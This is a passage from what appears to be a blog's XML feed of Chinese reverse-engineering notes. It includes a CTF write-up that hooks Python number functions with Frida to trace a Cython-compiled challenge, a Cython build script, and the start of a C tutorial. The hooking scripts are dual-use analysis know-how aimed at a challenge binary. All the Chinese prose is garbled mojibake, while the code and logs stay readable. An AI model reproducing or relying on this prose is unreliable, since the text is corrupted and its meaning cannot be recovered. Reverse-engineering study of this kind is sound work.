ç¬¦å·æ•´å‹ï¼Œä¼šæ”¾30ä½å†…å®¹è¿›å»ï¼Œä½œä¸ºå€¼</p><p><a href="https://www.cnblogs.com/ChangAn223/p/11495690.html">Python 3 çš„ int ç±»å‹è¯¦è§£ï¼ˆä¸ºä»€ä¹ˆ int ä¸å­˜åœ¨æº¢å‡ºé—®é¢˜ï¼Ÿï¼‰ - é•¿å®‰223 - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.thinkinpython.com/post/deep_python_4.html">4. Long Object åˆæ¢ - Think In Python</a></p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ä»¥ä¸‹è½¬æ¢å‡½æ•°æ¥è½¬æ¢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getNumber</span>(<span class="params">Nptr</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> ps = <span class="title class_">Process</span>.<span class="property">pointerSize</span></span><br><span class="line">    <span class="keyword">let</span> shift = ps == <span class="number">8</span>? <span class="number">30</span>:<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">let</span> length = <span class="title class_">Nptr</span>.<span class="title function_">add</span>(<span class="number">0x10</span>).<span class="title function_">readPointer</span>().<span class="title function_">toInt32</span>();</span><br><span class="line">    <span class="keyword">let</span> number = <span class="title function_">ptr</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> this_block = <span class="title function_">ptr</span>(<span class="title class_">Nptr</span>.<span class="title function_">add</span>(<span class="number">0x18</span>+i*(ps/<span class="number">2</span>)).<span class="title function_">readU32</span>())</span><br><span class="line">        number = number.<span class="title function_">or</span>(this_block.<span class="title function_">shl</span>(shift*i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®æµ‹è¯•ï¼Œè¿™ä¸ªå¯ä»¥hookå‡ºæ­£ç¡®çš„å€¼ï¼Œä½†æ˜¯ä¹˜æ³•ä¸å¯¹ï¼Œä¼¼ä¹å’Œåº•å±‚å®ç°æœ‰å…³ï¼ŒQAQæœ‰æ²¡æœ‰ä½¬æ•™æ•™æˆ‘</p><p>hookå‡ºçš„æ¯è½®çš„å€¼</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_And</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x9e3779ce&#x27;</span>, <span class="string">&#x27;0xffffffff&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_And</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x9e3779ce</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x13c6ef39&#x27;</span>, <span class="string">&#x27;0x10&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x13c6ef29</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x0&#x27;</span>, <span class="string">&#x27;0x278dde738&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x278dde738</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Add</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x13c6ef29&#x27;</span>, <span class="string">&#x27;0x278dde738&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Add</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x28ca4d661</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x2&#x27;</span>, <span class="string">&#x27;0x9e3779b9&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x9e3779bb</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x0&#x27;</span>, <span class="string">&#x27;0x3&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x3</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x31&#x27;</span>, <span class="string">&#x27;0x9e3779ce&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x9e3779ff</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Add</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x9e3779bb&#x27;</span>, <span class="string">&#x27;0x9e3779ff&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Add</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x13c6ef3ba</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x28ca4d661&#x27;</span>, <span class="string">&#x27;0x13c6ef3ba&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x3b0ca25db</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Add</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x5&#x27;</span>, <span class="string">&#x27;0x3b0ca25db&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Add</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x3b0ca25e0</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_And</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x3b0ca25e0&#x27;</span>, <span class="string">&#x27;0xffffffff&#x27;</span>]</span></span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰è¿˜æ˜¯å¾ˆå¯¹çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é¢˜é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> CTF </category>
          
          <category> è¯­è¨€ </category>
          
          <category> æ¯”èµ› </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cythonå­¦ä¹ </title>
      <link href="/posts/98181542.html"/>
      <url>/posts/98181542.html</url>
      
        <content type="html"><![CDATA[<p>æ€ä¹ˆæœ€è¿‘è¿™ä¹ˆå¤šCythonçš„é¢˜ï¼Œåšèµ·æ¥å¥½ç—›è‹¦ã€‚è€Œä¸”è¿™ç§é¢˜è¿˜æ˜¯é‚£ç§å¾ˆå¥½å‡ºï¼Œä½†æ˜¯ä¸å¥½é€†çš„ã€‚å½“ç„¶ï¼Œä¹Ÿå°±æ˜¯æš‚æ—¶äº†ã€‚ä½†å‡¡æœ‰ä½¬ç ”ç©¶æ¸…æ¥šç»“æ„ï¼Œéƒ½å¯ä»¥æä¸ªåç¼–è¯‘å™¨å‡ºæ¥ç›´æ¥ç§’ã€‚ä¸è¿‡å¥½åƒå°±è¿rustï¼Œgoè¿™ç§éƒ½æ²¡æœ‰ä¸“é—¨çš„åç¼–è¯‘å™¨ï¼Œå¯èƒ½å°±è¿˜æ—©äº†ã€‚ã€‚ã€‚</p><p>è¿™æ¬¡SCTFï¼ŒæŸå‡ºé¢˜äººå«æˆ‘è¯•è¯•ä»–å‡ºçš„é¢˜ï¼Œç„¶åå°±è¢«æ¶å¿ƒåˆ°äº†ã€‚</p><p>æˆ‘æœ¬èº«æ˜¯ä¸å–œæ¬¢å»ç ”ç©¶é‚£äº›ä»€ä¹ˆç»“æ„ä¹‹ç±»çš„ä¸œè¥¿ï¼Œå› ä¸ºä¸ä¸€æ ·çš„æ ¼å¼å¤ªå¤šäº†ï¼Œæ¯ä¸ªéƒ½ç ”ç©¶æ˜¾ç„¶æ˜¯ä¸é«˜æ•ˆçš„ï¼Œæˆ‘æƒ³æ‰¾åˆ°ä¸€ä¸ªå¯èƒ½çš„é€šè§£å»ç ”ç©¶æŸäº›é—®é¢˜</p><p>å› ä¸ºè¿™ä¸æ˜¯pythonç³»åˆ—çš„ç¬¬ä¸€ç¯‡äº†ï¼Œæ‰€ä»¥è¿™é‡Œåªè¯´ä¸€ä¸‹æˆ‘æƒ³çš„æ–°æ–¹æ³•ã€‚</p><h2 id="Cython">Cython</h2><p><a href="https://blog.csdn.net/MOU_IT/article/details/81876879">cythonæ˜¯ä»€ä¹ˆ-CSDNåšå®¢</a></p><p>Cythonæ˜¯ä¸€ä¸ªè¯­è¨€ï¼šå®Œå…¨åŒ…å«pythonè¯­è¨€å’Œéƒ¨åˆ†åŒ…å«Cè¯­è¨€å’Œé­”æ”¹Cè¯­è¨€çš„é›†åˆã€‚å®ƒç”±pythonå®ç°ç”¨äºå†™pythonæ¨¡å—ã€‚æ–‡ä»¶åç¼€æ˜¯pyxï¼Œå®ƒçš„ä½œç”¨åœ¨äºæé«˜pythonçš„é€Ÿåº¦ï¼Œç¼–è¯‘è¿‡ç¨‹ï¼špyx-&gt;c-&gt;pyd/soï¼ˆåˆ†åˆ«ä¸ºWindowsï¼Œlinuxï¼‰</p><p>å¯ä»¥å°è¯•è‡ªå†™ä¸€ä¸ªpyxæ–‡ä»¶ç”Ÿæˆpydåç”¨idaæ‰“å¼€pydæ–‡ä»¶ï¼Œå‘ç°å†…å®¹å’ŒåŸæ¥çš„å†…å®¹å·²ç»æˆªç„¶ä¸åŒï¼Œå¯ä»¥è¯´æ ¹æœ¬æ²¡æœ‰è¾¨è¯†åº¦ï¼Œæéš¾åˆ†æã€‚ä½†æ˜¯å¯ä»¥å‘ç°pydéƒ½è°ƒç”¨äº†python.dllçš„å‡½æ•°ï¼Œå…¶ä¸­æ‰€æœ‰è¿ç®—ç¬¦éƒ½åœ¨å…¶ä¸­æœ‰å¯¹åº”çš„å‡½æ•°ã€‚æˆ‘åœ¨æƒ³æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥å¾—åˆ°pydçš„æ‰§è¡Œæµç¨‹ã€‚</p><h2 id="Hookï¼Œå¯åŠ¨ï¼">Hookï¼Œå¯åŠ¨ï¼</h2><p>fridaï¼šæŒ‚é’©æ—¶é—´åœ¨pythonå±‚hookåç¬¬ä¸€æ¬¡æ‰§è¡Œhookå‡½æ•°ã€‚å¥½åƒä¸èƒ½å…¨éƒ¨hookï¼Œæ‰€ä»¥åªhookåŸºæœ¬è¿ç®—å‡½æ•°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> functionsToHook = [</span><br><span class="line">    <span class="string">&quot;PyNumber_Add&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_Subtract&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_Multiply&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_TrueDivide&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_Or&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_Xor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_And&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_Lshift&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_Rshift&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyObject_GetItem&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">functionsToHook.<span class="title function_">forEach</span>(<span class="function"><span class="params">functionName</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;python38.dll&quot;</span>, functionName), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> argsArray = [];</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                argsArray.<span class="title function_">push</span>(args[<span class="number">0</span>]); </span><br><span class="line">                argsArray.<span class="title function_">push</span>(args[<span class="number">1</span>]); </span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Error reading arguments: <span class="subst">$&#123;e&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(argsArray);</span><br><span class="line">            <span class="title function_">send</span>(&#123; <span class="attr">function</span>: functionName, <span class="attr">arguments</span>: argsArray &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="title function_">send</span>(&#123; <span class="attr">function</span>: functionName, <span class="attr">returnValue</span>: retval &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åæµ‹è¯•ï¼Œç»“æœå¤±è´¥äº†ã€‚QAQå› ä¸ºè¿™äº›å‡½æ•°çš„ä¼ å‚å’Œä¼ å‡ºéƒ½æ˜¯pythonçš„å€¼å¯¹è±¡ã€‚æ‰€ä»¥è¦æ‰¾ä¸ªæ–¹æ³•å»è§£æé‚£äº›å¯¹è±¡ã€‚ä»¥åŠæœ€åçš„æ¯”è¾ƒä¸çŸ¥é“æ˜¯ä»€ä¹ˆå‡½æ•°ï¼Œè¦çŸ¥é“æœ€åçš„å¯†æ–‡éœ€è¦hookè¿™ä¸ªå‡½æ•°ã€‚</p><p>å°è¯•å…ˆä½¿ç”¨idaåŠ¨è°ƒpythonï¼Œçœ‹çœ‹é‡Œé¢çš„å€¼å¯¹è±¡çš„ç©ºé—´æ˜¯æ€ä¹ˆæ ·çš„ã€‚</p><hr><p><a href="https://xz.aliyun.com/t/16155?time__1311=GuD%3D7Iqmxfhx%2FD0lD2DUoEtW9K7Txita4D">https://xz.aliyun.com/t/16155?time__1311=GuD%3D7Iqmxfhx%2FD0lD2DUoEtW9K7Txita4D</a></p><p>è¿™ä¸ªæ˜¯å­¤æ’å¸ˆå‚…åœ¨å…ˆçŸ¥ç¤¾åŒºé‡Œå†™çš„Cythonç›¸å…³çŸ¥è¯†ç‚¹ã€‚ï¼ˆå‚¬æ›´ï¼ï¼‰</p><h2 id="ç¼–è¯‘">ç¼–è¯‘</h2><p>Cythonï¼šå°†pythonå†…å®¹ç¼–è¯‘ä¸ºpydæ–‡ä»¶ï¼Œpydç±»ä¼¼äºDLLï¼Œéƒ½æ˜¯é™æ€çš„ï¼Œé€šè¿‡è°ƒç”¨python.dllçš„å‡½æ•°å®ç°è‡ªå·±çš„è¿ç®—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">from</span> Cython.Build <span class="keyword">import</span> cythonize</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    name=<span class="string">&#x27;module&#x27;</span>,</span><br><span class="line">    ext_modules=cythonize(</span><br><span class="line">        <span class="string">&quot;module.py&quot;</span>,</span><br><span class="line">        compiler_directives=&#123;<span class="string">&#x27;language_level&#x27;</span>: <span class="string">&quot;3&quot;</span>&#125;,</span><br><span class="line">    ),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ç±»ä¼¼äºè¿™æ ·ï¼Œæ‰§è¡Œåï¼Œä¼šç”Ÿæˆä¸€ä¸ª.cæ–‡ä»¶ï¼Œä¸€ä¸ª.pydæ–‡ä»¶ï¼Œpydæ–‡ä»¶æ˜¯ç”±cæ–‡ä»¶ç¼–è¯‘è€Œæ¥ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡pythonæºä»£ç å’Œcä»£ç æ¥å¯¹ç…§ç€çœ‹ç›¸å·®çš„å†…å®¹</p><h2 id="å¯¹æ¯”">å¯¹æ¯”</h2><p>ç±»å‹ï¼š</p><p>å„ä¸ªç±»å‹çš„å­˜å‚¨éƒ½æœ‰ä¸€ä¸ªå›ºå®šçš„å‡½æ•°å»è½¬æ¢ï¼Œ<br>å…¶å®ƒå¯ä»¥ç›´æ¥çœ‹ä¸Šé¢çš„åšå®¢QAQ</p><p>æ“ä½œï¼š</p><p>æ§åˆ¶æµå¾ˆæŠ½è±¡ï¼Œåªè¦å’Œå˜é‡æ‰¯ä¸Šå…³ç³»å°±ä¼šæœ‰å¥‡æ€ªçš„å‡½æ•°åŠ è¿›æ¥</p><p>æ¯”è¾ƒå‡½æ•°ç»å¸¸ä½¿ç”¨richCompareï¼Œå› æ­¤è¦æ˜¯æœ€ååŠ å¯†é€»è¾‘åœ¨è¿™é‡Œé¢æ¯”è¾ƒï¼Œå¯ä»¥ç›´æ¥hookè¿™ä¸ªå‡½æ•°æ¥å¾—åˆ°å¯†æ–‡</p><p>å‡½æ•°ï¼š</p><p>å‡½æ•°å˜ä¸ºä¸€å±‚åŒ…è£…ï¼Œæ¯ä¸€ä¸ªå‡½æ•°å¯ä»¥é€šè¿‡ç›´æ¥æ‰¾å‡½æ•°åçš„å¼•ç”¨æ¥æ‰¾åˆ°ä½ç½®ï¼ŒæŸ¥äº¤å‰å¼•ç”¨æ—¶ï¼Œä¸€ä¸ªæ˜¯å¤–å±‚çš„åŒ…è£…å‡½æ•°ï¼Œä¸€ä¸ªæ˜¯çœŸæ­£çš„å‡½æ•°ï¼ŒæŒ‰ç…§é¡ºåºç¼–è¯‘çš„è¯ï¼Œä¸€èˆ¬éƒ½æ˜¯ä¸Šé¢æ˜¯å¤–å±‚å‡½æ•°ï¼Œä¸‹é¢æ˜¯å†…å±‚å‡½æ•°ï¼Œæ‰€ä»¥ç›´æ¥æ‰¾ä¸‹é¢é‚£ä¸ªå°±å¯ä»¥æ‰¾åˆ°çœŸçš„å‡½æ•°</p><h2 id="è°ƒè¯•">è°ƒè¯•</h2><p>æ‰§è¡Œåé™„åŠ è°ƒè¯•python.exeå³å¯</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> è¯­è¨€ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€æ€»ç»“</title>
      <link href="/posts/76cbc618.html"/>
      <url>/posts/76cbc618.html</url>
      
        <content type="html"><![CDATA[<h1>Cè¯­è¨€å…¥é—¨</h1><p>æœ¬ç« å¿«é€Ÿè¿‡ä¸€éCè¯­è¨€çš„çŸ¥è¯†ï¼ŒåŒæ—¶æä¾›ä¸€ç§ä»é€†å‘è§’åº¦çœ‹å¾…ä¸åŒè¯­è¨€çš„è§†è§’ã€‚</p><h2 id="0x01-ä¸ºäº†å®ç°">0x01 ä¸ºäº†å®ç°</h2><p>ä»»ä½•ä¸€ä¸ªè¯­è¨€ï¼Œå‡æ˜¯ä¸ºäº†å®ç°ä¸€ä¸ªç›®çš„è€Œä½¿ç”¨çš„ã€‚ä»»ä½•ä¸€ä¸ªè¯­è¨€ï¼Œå‡æ˜¯ä¸ºäº†è§£å†³ä¸€ä¸ªç—›ç‚¹è€Œå‡ºç°çš„ã€‚Cæ­£æ˜¯è§£å†³äº†æ±‡ç¼–çš„ç¹çè€Œå‡ºç°çš„ï¼Œå®ƒæŠŠå¯„å­˜å™¨å’Œå†…å­˜çš„å„ç§æ“ä½œå°è£…åˆ°æ¯ä¸ªè¿‡ç¨‹çš„å˜é‡ä¹‹ä¸­æ¥ç®€åŒ–æŒ‡ä»¤çš„ç¼–å†™ã€‚</p><p>Cè¯­è¨€åŸºäºé¢å‘è¿‡ç¨‹ã€‚CPUä»ç¨‹åºå…¥å£ç‚¹æŠ½å‡ºä¸€æ¡æŒ‡ä»¤ï¼Œç„¶åæ‰§è¡Œï¼Œå†æŠ½å‡ºä¸‹ä¸€ä¸ªæŒ‡ä»¤ï¼Œç„¶åå†æ‰§è¡Œï¼Œç›´åˆ°ç¨‹åºç»“æŸã€‚è¿™å°±å«è¿‡ç¨‹ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œé¢å‘è¿‡ç¨‹çš„è¿‡ç¨‹ä¹Ÿå¯ä»¥å«åšå‡½æ•°ã€‚ä¸€ä¸ªå‡½æ•°çš„ç»“æŸå¯ä»¥è¯´æ˜¯ä¸€ä¸ªè¿‡ç¨‹çš„ç»“æŸã€‚åœ¨Cè¯­è¨€ä¸­ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p><h2 id="0x02-è¿‡ç¨‹">0x02 è¿‡ç¨‹</h2><h3 id="00-è¿‡ç¨‹çš„å®šä¹‰">00 è¿‡ç¨‹çš„å®šä¹‰</h3><p>Cè¯­è¨€ä¸­ï¼Œè¿‡ç¨‹çš„å®šä¹‰å°±æ˜¯ä¸€ä¸ªæœ‰0æˆ–å¤šä¸ªè¾“å…¥ï¼Œ0æˆ–å¤šä¸ªè¾“å‡ºçš„å‡½æ•°ã€‚é€šå¸¸æ¥è®²ï¼Œåªè¦æ˜¯{}å¤§æ‹¬å·åŒ…è£¹çš„ç©ºé—´ï¼Œéƒ½è¢«è§†ä¸ºä¸€ä¸ªå•ç‹¬çš„è¿‡ç¨‹ï¼ŒåŒ…æ‹¬åé¢çš„å¾ªç¯ä½“ï¼Œé€‰æ‹©ä½“ç­‰ç­‰ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¿‡ç¨‹æ˜¯0è¾“å…¥ï¼Œ1è¾“å‡ºçš„å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">say</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a+b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¿‡ç¨‹æ˜¯ä¸€ä¸ª2è¾“å…¥ï¼Œ0è¾“å‡ºçš„å‡½æ•°ã€‚</p><p>å¯¹äºä¸€ä¸ªå‡½æ•°ï¼Œå…¶ä¸»è¦ä½œç”¨å°±æ˜¯è¿”å›ä¸€ä¸ªæ•°å€¼ï¼Œæˆ‘ä»¬å«å®ƒè¿”å›å€¼ï¼Œä¹Ÿå°±æ˜¯<code>return 0;</code>è¿™ä¸ªè¯­å¥ï¼Œä½†æ˜¯è¿˜å¯èƒ½æœ‰å…¶å®ƒæ•ˆæœï¼Œæ¯”å¦‚æ‰“å°ä¸€ä¸ªå­—ç¬¦ä¸²åˆ°å±å¹•ï¼Œè¿™ç§é™¤äº†è¿”å›ä¸€ä¸ªå€¼çš„å…¶å®ƒæ•ˆæœè¢«å«åš<code>å‰¯ä½œç”¨</code>ã€‚printfçš„å‰¯ä½œç”¨å°±æ˜¯è¾“å‡ºå†…å®¹åˆ°å±å¹•ï¼Œå®ƒçš„è¿”å›å€¼å°±æ˜¯è¾“å‡ºå†…å®¹æˆåŠŸçš„ä¸ªæ•°ã€‚Cè¯­è¨€ä¸­å‡½æ•°çš„æœ¬è´¨å°±æ˜¯å®ƒçš„è¿”å›å€¼</p><h3 id="01-åˆ›å»ºä¸€ä¸ªè¿‡ç¨‹">01 åˆ›å»ºä¸€ä¸ªè¿‡ç¨‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a+b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">return_type <span class="title function_">identifier</span><span class="params">(type parameter,...)</span>&#123;</span><br><span class="line">    <span class="comment">//function body</span></span><br><span 